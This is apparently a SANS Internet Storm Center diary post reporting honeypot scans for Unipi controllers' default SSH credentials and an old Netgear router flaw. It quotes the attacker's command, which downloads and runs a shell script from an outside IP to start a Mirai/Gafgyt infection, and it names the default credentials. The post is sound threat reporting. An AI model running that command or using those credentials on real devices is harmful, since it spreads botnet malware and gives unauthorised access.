---
title: It Is 2025, And We Are Still Dealing With Default IoT Passwords And Stupid 2013 Router Vulnerabilities, (Mon, May 12th)
url: https://isc.sans.edu/diary/rss/31940
source: SANS Internet Storm Center, InfoCON: green
date: 2025-05-13
fetch_date: 2025-10-06T22:30:48.090745
---

# It Is 2025, And We Are Still Dealing With Default IoT Passwords And Stupid 2013 Router Vulnerabilities, (Mon, May 12th)

# [Internet Storm Center](/)

[Sign In](/login.html)
[Sign Up](/register.html)

Handler on Duty: [Johannes Ullrich](/handler_list.html#johannes-ullrich "Johannes Ullrich")

Threat Level: [green](/infocon.html)

* [previous](/diary/31932)
* [next](/diary/31942)

My next class:

|  |  |  |
| --- | --- | --- |
| [Application Security: Securing Web Apps, APIs, and Microservices](https://www.sans.org/event/dallas-2025/course/application-security-securing-web-apps-api-microservices) | Dallas | Dec 1st - Dec 6th 2025 |

# [It Is 2025, And We Are Still Dealing With Default IoT Passwords And Stupid 2013 Router Vulnerabilities](/forums/diary/It%2BIs%2B2025%2BAnd%2BWe%2BAre%2BStill%2BDealing%2BWith%2BDefault%2BIoT%2BPasswords%2BAnd%2BStupid%2B2013%2BRouter%2BVulnerabilities/31940/)

**Published**: 2025-05-12. **Last Updated**: 2025-05-12 13:49:21 UTC
**by** [Johannes Ullrich](https://plus.google.com/101587262224166552564?rel=author) (Version: 1)

[0 comment(s)](/diary/It%2BIs%2B2025%2BAnd%2BWe%2BAre%2BStill%2BDealing%2BWith%2BDefault%2BIoT%2BPasswords%2BAnd%2BStupid%2B2013%2BRouter%2BVulnerabilities/31940/#comments)

![](https://isc.sans.edu/diaryimages/images/Screenshot%202025-05-12%20at%209_47_21%E2%80%AFAM.png)Unipi Technologies is a company developing programmable logic controllers for a number of different applications like home automation, building management, and industrial controls. The modules produced by Unipi are likely to appeal to a more professional audience. All modules are based on the "Marvis" platform, a customized Linux distribution maintained by Unipi.

In the last couple of days, we did observe scans for the unipi default username and password ("unipi" and "unipi.technology")  in our honeypot logs. The scans originate from [176.65.148.10](/ipinfo.html?ip=176.65.148.10), an IP address that is well-known to our database.

In addition to SSH, the IP address also scans for an ancient Netgear vulnerability from 2013, which only got a CVE number last year (CVE-2024-12847).

Both, the SSH as well as the "Netgear" exploit attempts are executing the same commands:

> `cd /tmp; rm -rf wget.sh curl.sh; wget http://213.209.143.44/ssh.sh; chmod +x ssh.sh; sh ssh.sh;curl -o http://213.209.143.44/ssh.sh; chmod +x ssh.sh; sh ssh.sh`

which kicks off the standard Mirai/Gafgyt install chain.

---
Johannes B. Ullrich, Ph.D. , Dean of Research, [SANS.edu](https://sans.edu)
[Twitter](https://jbu.me/164)|

Keywords: [default password netgear](/tag.html?tag=default password netgear) [gagfy](/tag.html?tag=gagfy) [mirai](/tag.html?tag=mirai) [unipi](/tag.html?tag=unipi)

[0 comment(s)](/diary/It%2BIs%2B2025%2BAnd%2BWe%2BAre%2BStill%2BDealing%2BWith%2BDefault%2BIoT%2BPasswords%2BAnd%2BStupid%2B2013%2BRouter%2BVulnerabilities/31940/#comments)

My next class:

|  |  |  |
| --- | --- | --- |
| [Application Security: Securing Web Apps, APIs, and Microservices](https://www.sans.org/event/dallas-2025/course/application-security-securing-web-apps-api-microservices) | Dallas | Dec 1st - Dec 6th 2025 |

* [previous](/diary/31932)
* [next](/diary/31942)

### Comments

[Login here to join the discussion.](/login)

Top of page

×

![modal content]()

[Diary Archives](/diaryarchive.html)

* [![SANS.edu research journal](https://isc.sans.edu/images/researchjournal5.png)](/j/research)
* [Homepage](/index.html)
* [Diaries](/diaryarchive.html)
* [Podcasts](/podcast.html)
* [Jobs](/jobs)
* [Data](/data)
  + [TCP/UDP Port Activity](/data/port.html)
  + [Port Trends](/data/trends.html)
  + [SSH/Telnet Scanning Activity](/data/ssh.html)
  + [Weblogs](/weblogs)
  + [Domains](/data/domains.html)
  + [Threat Feeds Activity](/data/threatfeed.html)
  + [Threat Feeds Map](/data/threatmap.html)
  + [Useful InfoSec Links](/data/links.html)
  + [Presentations & Papers](/data/presentation.html)
  + [Research Papers](/data/researchpapers.html)
  + [API](/api)
* [Tools](/tools/)
  + [DShield Sensor](/howto.html)
  + [DNS Looking Glass](/tools/dnslookup)
  + [Honeypot (RPi/AWS)](/tools/honeypot)
  + [InfoSec Glossary](/tools/glossary)
* [Contact Us](/contact.html)
  + [Contact Us](/contact.html)
  + [About Us](/about.html)
  + [Handlers](/handler_list.html)* [About Us](/about.html)

[Slack Channel](/slack/index.html)

[Mastodon](https://infosec.exchange/%40sans_isc)

[Bluesky](https://bsky.app/profile/sansisc.bsky.social)

[X](https://twitter.com/sans_isc)

![](/adimg.html?id=)

© 2025 SANS™ Internet Storm Center
Developers: We have an [API](/api/) for you!   [![Creative Commons License](/images/cc.png)](https://creativecommons.org/licenses/by-nc-sa/4.0/)

* [Link To Us](/linkback.html)
* [About Us](/about.html)
* [Handlers](/handler_list.html)
* [Privacy Policy](/privacy.html)